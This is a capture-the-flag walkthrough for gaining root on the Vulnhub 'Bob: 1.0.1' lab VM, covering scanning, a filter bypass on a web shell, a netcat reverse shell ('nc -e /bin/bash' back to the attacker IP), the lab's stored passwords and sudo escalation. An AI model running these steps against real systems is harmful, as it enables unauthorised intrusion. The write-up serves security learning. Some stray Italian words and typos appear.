<style> 
    body { 
        background-color: white; 
        color: black;
        margin-top: 2cm;
        margin-left: 1.5cm;
        margin-right: 1.5cm;
    }
</style>

# Gain root privileges on Bob: 1.0.1 virtual machine

Gaining root privileges on a web server with the ultimate goal of capturing a flag is the aim of this demo. 
The target is a vulnerable web server running within the [Bob: 1.0.1](https://www.vulnhub.com/entry/bob-101,226/) virtual machine, publicly available on [Vulnhub](www.vulnhub.com) platform. 

The walkthrough [Hack The Bob: 1.0.1](https://www.hackingarticles.in/hack-the-bob-1-0-1-vm-ctf-challenge/) is the baseline of the following report.

## Content

- [**Discovery**](#discovery) &rightarrow; network scanning and services enumeration
- [**Initial Access**](#initial-access) &rightarrow; expoit RCE vulnerability on web application
- [**Execution**](#execution) &rightarrow; establish reverse shell using netcat
- [**Credential Access**](cre) &rightarrow; abuse of legitimate credentials stored unsecurely in the machine
- [**Privilege Escalation**](pri) &rightarrow; abuse of valid accounts with high privileges

## Threat Model

The threat model of the demo is that the attacker is physically present in the same local network of the target and has the ability to communicate with it opening a TCP connection.
Initial access is obtained by Exploit Public-Facing Application technique
The vulnerability will be exploited via browser and used to obtain initial access 


### Discovery
The initial step involves scanning the local network to locate the IP address of the target machine.
This step is taken executing the following command. 

```bash
netdiscover -r 10.0.2.0/24
```
It is determined that Bob: 1.0.1 has IP address 10.0.2.10, while the Kali machine has IP address 10.0.2.6

Following this, the command

```bash
nmap -p- -A 10.0.2.10 
```
is employed. It takes as input the target IP along with specific parameters (outlined below) and provides in output an accurate enumeration of the servers running on target system. For each service it provides port numbers, protocols and other details corresponding to it. 

Command options:
- `-p-` scans all port range on target machine
- `-A` it enables OS detection, version scanning of services, traceroute, and other advanced detection techniques. Essentially, it gets as much information as possible about the target machine.

The result of `nmap` command is shown in the following screenshot.

![1](images/nmap.png)

Notable things:
- there is a web server is active on port 80, this server has an RCE vulnerability exploitable without authentication
- there is an SSH server listening on port 25468 

For convenience, this IP address is added to the file `/etc/hosts` on the Kali machine and linked to the name "hackthebob".

Upon initial inspection, navigating to `http://hackthebob/` reveals what appears to be a website under construction for an high school.

![2](images/home_page.png)

Despite browsing through all the available pages, no significant information of interest is found.

However, upon closer analysis of `nmap` output detailing the web server, it becomes apparent that the web server hosts a file named `robots.txt`. Such a file typically contains directives for web crawlers regarding which pages to show or to ignore.

Examining its contents, four entries stand out as disallowed `/login.php`, `/passwords.html`, `/lat_memo.html` and `/dev_shell.php`. These names are interesting names, but further investigation reveals that only the page `http://hackthebob/dev_shell.php` is worthy: it appears to be a web shell, suggesting a potential entry point for a possible exploration.

### Initial Access
The first action is to test some basic bash commands to examine how the server reacts.

It appears that there's some internal block or filter in place, because commands such as `ls` or `pwd` display an error message, while the `id` command provides a coherent output.

By attempting the command `id | ls` it became possible to list files. This strategy of nested commands can bypass the filter exploiting the fact that `ls` takes in input `id` output so that is possible to circumvent the filter.


![3](images/dev.png)


Now downloading with `curl` command `dev_shell.txt.bak` file, that is probably the backup file of `dev_shell.php`, it is possible to see the reason why the other commands didn't work.

![4](images/blocked.png)

### Execution
It is time now to establish a connection through the web shell and the Kali machine. This is done using Netcat which is a command line tool for remote communication over TCP connections

- on Kali side the command `nc -lvp 6000` is ran, so the Kali machine is now listening on port 6000 for connection requests: this is the server side of the future TCP connection
- on the web interface of the target, command `id | nc -e /bin/bash 10.0.2.6 6000` is ran: this will be the client side of the TCP connection.

The spawned shell is a basic `sh` shell, so in order to have a more versatile and powerful shell, on the server side of the connection the following text line is written

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
- `python -c` indicates the fact that the command following is executed by command line
- `import pty;pty.spawn("/bin/bash")` imports a Python library and calls a function that spawns a bash shell

Now it is possible to look around and move in the file system of `Bob: 1.0.1` machine looking for some interesting things. The current account is `www-data`, but it is needed to gain higher privileges to complete the challenge, in fact moving to the root directory of the file system and listing files with `ls -l` command it is possible to see that the `flag.txt` file can be opened only by root account because it is the legitimate owner.

In the `/home` directory there are four other directories with person names  (bob, elliot, jc, seb). In the first one, on path `/home/bob/Documents` there are an encrypted file with name `login.txt.gpg` and another directory named "Secret".

On path `/home/bob/Documents/Secret/Keep_Out/No_Lookie_In_Here` there is a script `notes.sh`: executing it the output is a list of apparently no sense phrases.
This output seams to have no meaning, but taking the first letter of each line the word HARPOCRATES is composed (this is the name of an Egyptian divinity), maybe it is the passphrase for the encrypted file.

All steps from the netcat connection establishment to this point are shown in the following screenshot

![5](images/harpo.png)

Now it's needed to change account in order to decrypt `login.txt.gpg` bacause the current account `www-data` is not allowed.

In `/home/elliot` there is a file, `theadminisdumb.txt`, that contains a long text with embedded two user's password. 
Stando a questo file elliot's account has password 'theadminisdumb' while the jc' one has password 'Qwerty'.

To test this information, command `su elliot` is ran and, after inserting his password, the current account changes to elliot's one. Then it turns out that he has permission for decrypting the `.gpg` file, so the following command is ran for attempting decryption.

```bash
gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
```
Decryption succeeded thanks to the right passphrase.
Having the file in clear it is possible to read Bob's password which is 'b0bcat_'.

All the steps citati are shown in the following screenshot.

![6](images/elliot.png)

So now it is possible to change account again and impersonate Bob. Salta fuori that Bob is a user with root privileges (while Elliot did not)

It is important to notice that Bob is not the owner of the file flag.txt, so it is not possible yet to capture the flag, but since Bob is a superuser, running just `sudo su` it is possible to became root account, this allow to capture the flag and conclude the challenge.

![7](images/root.png)

A large set of credentials assure persistence over this web server, but it is also notable, from the utput of nmap command, that there is another server running on the machine

I tryed to connect with hackthebob on bob account via SSH
`ssh -p 25468 bob@hackthebob` and I realised that with just this command i was inside the web seerver 
i didn't have to interrract via browser


![8](images/ssh.png)


fine